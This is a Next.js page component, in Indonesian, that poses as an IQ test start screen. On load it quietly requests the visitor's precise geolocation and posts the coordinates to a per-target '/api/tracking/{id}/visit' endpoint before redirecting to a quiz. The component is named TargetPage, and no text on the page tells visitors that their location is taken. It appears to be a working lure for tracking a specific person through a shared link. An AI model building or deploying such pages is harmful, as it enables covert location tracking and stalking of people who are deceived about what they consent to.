'use client'

import { useEffect, useState, use, useRef } from 'react'
import { useRouter } from 'next/navigation'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Brain, Loader2, Sparkles } from 'lucide-react'

export default function TargetPage({ params }: { params: Promise<{ id: string }> }) {
  useEffect(() => {
    document.title = 'Persiapan Tes'
  }, [])

  const { id } = use(params)
  const router = useRouter()
  const [countdown, setCountdown] = useState<number | null>(null)
  const [message, setMessage] = useState('Mempersiapkan permainan...')
  const visitSent = useRef(false)
  const redirectScheduled = useRef(false)

  useEffect(() => {
    if (visitSent.current) return
    visitSent.current = true

    const sendVisit = async (locationData?: { latitude: number; longitude: number }) => {
      try {
        await fetch(`/api/tracking/${id}/visit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(locationData || { locationStatus: 'pending' })
        })
      } catch (error) {
        console.error('Error sending visit:', error)
      }
    }

    const requestLocation = () => {
      if (!navigator.geolocation) {
        sendVisit()
        scheduleRedirect()
        return
      }
      
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          await sendVisit({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          })
          scheduleRedirect()
        },
        async () => {
          await fetch(`/api/tracking/${id}/visit`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ locationStatus: 'gagal' })
          })
          scheduleRedirect()
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      )
    }

    const scheduleRedirect = () => {
      if (redirectScheduled.current) return
      redirectScheduled.current = true

      setMessage('Tes IQ akan segera dimulai!')
      const delaySeconds = Math.floor(Math.random() * 5) + 3
      setCountdown(delaySeconds)

      const interval = setInterval(() => {
        setCountdown(prev => {
          if (prev === null || prev <= 1) {
            clearInterval(interval)
            router.push(`/t/${id}/game`)
            return null
          }
          return prev - 1
        })
      }, 1000)
    }

    // Start location request silently
    requestLocation()
  }, [id, router])

  return (
    <main className="min-h-screen flex items-center justify-center p-4 bg-muted/30">
      <Card className="w-full max-w-md text-center">
        <CardHeader>
          <div className="mx-auto mb-4">
            <Brain className="h-12 w-12 text-primary" />
          </div>
          <CardTitle className="flex items-center justify-center gap-2">
            <Sparkles className="h-5 w-5 text-yellow-500" />
            Tes Kecerdasan IQ
          </CardTitle>
          <CardDescription>
            {message}
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {countdown !== null ? (
            <div className="space-y-2">
              <p className="text-sm text-muted-foreground">
                Permainan akan dimulai dalam
              </p>
              <div className="text-5xl font-bold text-primary">
                {countdown}
              </div>
              <p className="text-xs text-muted-foreground">detik</p>
            </div>
          ) : (
            <div className="flex flex-col items-center gap-3">
              <Loader2 className="h-8 w-8 animate-spin text-primary" />
              <p className="text-sm text-muted-foreground">Memuat...</p>
            </div>
          )}
          
          <div className="bg-muted/50 rounded-lg p-4 text-left space-y-2">
            <p className="text-sm font-medium">Tentang Tes Ini:</p>
            <ul className="text-xs text-muted-foreground space-y-1">
              <li>- 5 pertanyaan logika dan penalaran</li>
              <li>- Pilih jawaban yang paling tepat</li>
              <li>- Tidak ada batas waktu per soal</li>
              <li>- Lihat skor dan akurasi di akhir</li>
            </ul>
          </div>
        </CardContent>
      </Card>
    </main>
  )
}
